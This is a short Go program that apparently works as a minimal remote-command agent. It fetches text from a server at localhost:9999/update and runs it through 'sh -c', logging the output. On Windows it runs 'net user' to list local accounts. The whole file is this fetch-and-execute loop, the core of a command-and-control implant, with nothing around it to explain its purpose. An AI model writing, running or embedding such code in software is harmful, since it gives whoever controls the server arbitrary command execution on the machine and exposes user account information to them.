package main

import (
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"runtime"
)

func main()  {
	client := http.Client{}
	resp, err := client.Get("http://localhost:9999/update")

	if err != nil {
		log.Fatal(err)
	}

	data, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
		os.Exit(1)
	}

	err = resp.Body.Close()
	if err != nil {
		log.Fatal(err)
		os.Exit(1)
	}
	command := string(data)
	sh := "sh"
	c := "-c"
	if runtime.GOOS == "windows" {
		command = "net user"
		sh = "cmd"
		c = "/C"
	}
	cmd := exec.Command(sh, c, command)
	output, err := cmd.Output()
	if err != nil {
		log.Print(err)
		os.Exit(1)
	}
	log.Print(string(output))

}